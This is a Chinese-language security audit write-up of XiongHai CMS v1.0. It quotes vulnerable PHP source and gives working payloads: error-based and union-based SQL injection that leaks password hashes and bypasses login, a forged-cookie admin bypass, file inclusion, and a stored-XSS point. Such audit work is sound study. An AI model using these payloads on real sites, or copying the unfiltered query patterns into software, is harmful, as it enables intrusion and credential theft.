>第一篇审计

用`Fortify`在后台对cms进行静态分析

## index.php任意文件包含

```php
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include('files/'.$action.'.php'); //载入相应文件
?>
```

`admin/index.php`内容一样,同样存在任意文件包含

在网站根目录新建`info.php`写入`phpinfo`,传入`r=../info`即可对`info.php`进行包含

但是由于`addslashes`的存在以及php版本的限制,不能进行00截断绕过

## admin/files/login.php存在SQL注入

```php
<?php
ob_start();
require '../inc/conn.php';
$login = $_POST['login'];
$user = $_POST['user'];
$password = $_POST['password'];
$checkbox = $_POST['checkbox'];

if ($login <> "") {
  $query = "SELECT * FROM manage WHERE user='$user'";
  $result = mysql_query($query) or die('SQL语句有误：' . mysql_error());
  $users = mysql_fetch_array($result);

  if (!mysql_num_rows($result)) {
    echo "<Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();</Script>";
    exit;
  } else {
    $passwords = $users['password'];
    if (md5($password) <> $passwords) {
      echo "<Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();</Script>";
      exit;
    }
    //写入登录信息并记住30天
    if ($checkbox == 1) {
      setcookie('user', $user, time() + 3600 * 24 * 30, '/');
    } else {
      setcookie('user', $user, 0, '/');
    }
    echo "<script>this.location='?r=index'</script>";
    exit;
  }
  exit;
  ob_end_flush();
}
?>
```

注意到`$user = $_POST['user'];`和`$query = "SELECT * FROM manage WHERE user='$user'";`

`user`没有经过任何过滤就拼接到语句中

首先是可以使用报错注入读取用户名和密码

user传入`' or updatexml(1,concat(0x7e,(select @@version),0x7e),1)#`即可带出数据

user传入`' or updatexml(1,concat(0x7e,(select group_concat(password) from manage),0x7e),1)#`即可读出md5之后的密码

除了对md5进行反查外,还可以通过伪造password来进行登录,已知一共有8列

user传入`' union select 1,2,3,4,5,6,7,8#`,可以导致sql查询返回的结果为4,而验证密码手段为`md5($password) <> $passwords`,传入某个字符串的md5并将该字符串作为密码传入即可登录

`asdf 912ec803b2ce49e4a541068d495ab570`

user传入`' union select 1,2,3,'912ec803b2ce49e4a541068d495ab570',5,6,7,8#`,password传入`asdf`即可登录

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209734.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209433.png)

>注意右上方的用户名

## inc/checklogin.php存在权限绕过漏洞

```php
<?php
$user=$_COOKIE['user'];
if ($user==""){
header("Location: ?r=login");
exit;	
}
?>
```

`$_COOKIE['user']`可以被用户控制,从而绕过权限检查,使用cms中的大部分功能

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022212075.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022214447.png)

>注意右上方的用户名

## admin/files/editlink.php存在SQL注入

```php
<?php
require '../inc/checklogin.php';
require '../inc/conn.php';
$linklistopen='class="open"';
$id=$_GET['id'];
$query = "SELECT * FROM link WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$link = mysql_fetch_array($resul);
```

单引号闭合即可,可以使用报错注入

`admin/?r=editlink&id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+`

## admin/files/editcolumn.php存在SQL注入

```php
<?php
require '../inc/checklogin.php';
require '../inc/conn.php';
$columnopen = 'class="open"';
$id = $_GET['id'];
$type = $_GET['type'];

if ($type == 1) {
    $query = "SELECT * FROM nav WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：' . mysql_error());
    $nav = mysql_fetch_array($resul);
}
if ($type == 2) {
    $query = "SELECT * FROM navclass WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：' . mysql_error());
    $nav = mysql_fetch_array($resul);
}

$save = $_POST['save'];
$name = $_POST['name'];
$keywords = $_POST['keywords'];
$description = $_POST['description'];
$px = $_POST['px'];
$xs = $_POST['xs'];
if ($xs == "") {
    $xs = 1;
}
$tuijian = $_POST['tuijian'];
if ($tuijian == "") {
    $$tuijian = 0;
}

$content = $_POST['content'];

if ($save == 1) {

    if ($name == "") {
        echo "<script>alert('抱歉，栏目名称不能为空。');history.back()</script>";
        exit;
    }

    if ($type == 1) {
        $query = "UPDATE nav SET 
name='$name',
keywords='$keywords',
description='$description',
xs='$xs',
px='$px',
content='$content',
date=now()
WHERE id='$id'";
        @mysql_query($query) or die('修改错误：' . mysql_error());
        echo "<script>alert('亲爱的，一级栏目已经成功编辑。');location.href='?r=columnlist'</script>";
        exit;
    }

    if ($type == 2) {
        $query = "UPDATE navclass SET 
name='$name',
keywords='$keywords',
description='$description',
xs='$xs',
px='$px',
tuijian='$tuijian',
date=now()
WHERE id='$id'";
        @mysql_query($query) or die('修改错误：' . mysql_error());

        echo "<script>alert('亲爱的，二级栏目已经成功编辑。');location.href='?r=columnlist'</script>";
        exit;
    }
}
?>
```

同上

## admin/files/columnlist.php存在SQL注入

```php
<?php
require '../inc/checklogin.php';
require '../inc/conn.php';
$columnlistopen = 'class="open"';

$delete = $_GET['delete'];

$delete2 = $_GET['delete2'];

if ($delete <> "") {
    $query = "DELETE FROM nav WHERE id='$delete'";
    $result = mysql_query($query) or die('SQL语句有误：' . mysql_error());
    echo "<script>alert('亲，ID为" . $delete . "的栏目已经成功删除！');location.href='?r=columnlist'</script>";
    exit;
}
if ($delete2 <> "") {
    $query = "DELETE FROM navclass WHERE id='$delete2'";
    $result = mysql_query($query) or die('SQL语句有误：' . mysql_error());
    echo "<script>alert('亲，ID为" . $delete2 . "的二级栏目已经成功删除！');location.href='?r=columnlist'</script>";
    exit;
}
?>
```

单引号闭合即可,可以使用报错注入

`admin/?r=columnlist&delete=' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+`

## admin/files/commentlist.php存在SQL注入

```php
<?php
require '../inc/checklogin.php';
require '../inc/conn.php';
$hdopen = 'class="open"';
$type = $_GET['type'];
if ($type == 'comment') {
    $fhlink = "?r=commentlist&type=comment";
    $fhname = "评论";
    $type = 1;
    $taojian = "type=1 AND cid<>0";
    $biao = "content";
}
if ($type == 'message') {
    $fhlink = "?r=commentlist&type=message";
    $fhname = "留言";
    $type = 2;
    $taojian = "type=2 AND cid=0";
    $biao = "content";
}

if ($type == 'download') {
    $fhlink = "?r=commentlist&type=download";
    $fhname = "下载评论";
    $type = 3;
    $taojian = "type=3";
    $biao = "download";
}

$pageyema = $fhlink . "&page=";

$delete = $_GET['delete'];
if ($delete <> "") {
    $query = "DELETE FROM interaction WHERE id='$delete'";
    $result = mysql_query($query) or die('SQL语句有误：' . mysql_error());
    echo "<script>alert('亲，ID为" . $delete . "的" . $fhname . "已经成功删除！');location.href='" . $fhlink . "'</script>";
    exit;
}
?>
```

同上,在后台传递到sql语句中的参数基本上都没有进行过滤,后台的大部分模块都存在sql注入

## files/submit.php存在SQL注入

```php
<?php
session_start();
require 'inc/conn.php';
$type=addslashes($_GET['type']);
$name=$_POST['name'];
$mail=$_POST['mail'];
$url=$_POST['url'];
$content=$_POST['content'];
$cid=$_POST['cid'];
$ip=$_SERVER["REMOTE_ADDR"];
$tz=$_POST['tz'];
if ($tz==""){$tz=0;}
$jz=$_POST['jz'];

...

$query = "SELECT * FROM interaction WHERE( mail = '$mail')";
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$tx = mysql_fetch_array($result);
if (!mysql_num_rows($result)){  
$touxiang = mt_rand(1,100);
}else{
$touxiang = $tx['touxiang'];
}
```

先用`'`闭合,再用`)`闭合即可,可以使用报错注入

`' or updatexml(1,concat(0x7e,(select @@version),0x7e),1))#`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031200549.png)

## files/content.php存在SQL注入

```php
<?php 
require 'inc/conn.php';
require 'inc/time.class.php';
$query = "SELECT * FROM settings";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$info = mysql_fetch_array($resul);

$id=addslashes($_GET['cid']);
$query = "SELECT * FROM content WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$content = mysql_fetch_array($resul);

$navid=$content['navclass'];
$query = "SELECT * FROM navclass WHERE id='$navid'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$navs = mysql_fetch_array($resul);

//浏览计数
$query = "UPDATE content SET hit = hit+1 WHERE id=$id";
@mysql_query($query) or die('修改错误：'.mysql_error());
?>
```

`$query = "UPDATE content SET hit = hit+1 WHERE id=$id";`没有用`'`进行闭合,可以进行报错注入

`?r=content&cid=1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1);`

## files/software.php存在SQL注入

```php
<?php
require 'inc/conn.php';
require 'inc/time.class.php';
$query = "SELECT * FROM settings";
$resul = mysql_query($query) or die('SQL语句有误：' . mysql_error());
$info = mysql_fetch_array($resul);
$id = addslashes($_GET['cid']);
$query = "SELECT * FROM download WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：' . mysql_error());
$download = mysql_fetch_array($resul);

//浏览计数
$query = "UPDATE download SET hit = hit+1 WHERE id=$id";
@mysql_query($query) or die('修改错误：' . mysql_error());
?>
```

同上

## install/index.php存在SQL注入

```php
<?PHP
ob_start();
error_reporting(0);
header('Content-Type:text/html;charset=utf-8');
if (file_exists('InstallLock.txt')) {
	echo "你已经成功安装熊海内容管理系统，如果需要重新安装请删除install目录下的InstallLock.txt";
	exit;
}
$save = $_POST['save'];
$user = $_POST['user'];
$password = md5($_POST['password']);
$dbhost = $_POST['dbhost'];
$dbuser = $_POST['dbuser'];
$dbpwd = $_POST['dbpwd'];
$dbname = $_POST['dbname'];
if ($save <> "") {

    ...

	include '../inc/db.class.php';
	$db = new DBManage($dbhost, $dbuser, $dbpwd, $dbname, 'utf8');
	$db->restore('seacms.sql');
	$content = "<?php
\$DB_HOST='" . $dbhost . "';
\$DB_USER='" . $dbuser . "';
\$DB_PWD='" . $dbpwd . "';
\$DB_NAME='" . $dbname . "';
?>
";
	$of = fopen('../inc/conn.info.php', 'w');
	if ($of) {
		fwrite($of, $content);
	}
	echo "MySQL数据库连接配置成功!<br /><br />";


	$conn = @mysql_connect($dbhost, $dbuser, $dbpwd) or die('数据库连接失败，错误信息：' . mysql_error());
	mysql_select_db($dbname) or die('数据库错误，错误信息：' . mysql_error());
	mysql_query('SET NAMES UTF8') or die('字符集设置错误' . mysql_error());

	$query = "UPDATE manage SET user='$user',password='$password',name='$user'";
	@mysql_query($query) or die('修改错误：' . mysql_error());
	echo "管理信息已经成功写入!<br /><br />";


	$content = "熊海内容管理系统 V1.0\r\n\r\n安装时间：" . date('Y-m-d H:i:s');
	$of = fopen('InstallLock.txt', 'w');
	if ($of) {
		fwrite($of, $content);
	}
	fclose($of);
	echo "为防止重复安装，安装锁已经生成!<br /><br />";
	echo "<font color='#006600'>恭喜,熊海网站管理系统已经成功安装！</font>";
	exit;
	ob_end_flush();
}
?>
```

`$query = "UPDATE manage SET user='$user',password='$password',name='$user'";`单引号注入,但是由于安装完成后会生成`InstallLock.txt`防止重复安装,需要去除这个文件才能够利用这一注入点

## files/submit.php存在存储型XSS

`$content = addslashes(strip_tags($content)); //过滤HTML`只对内容进行了过滤,而没有对昵称进行过滤,在昵称处插入XSS即可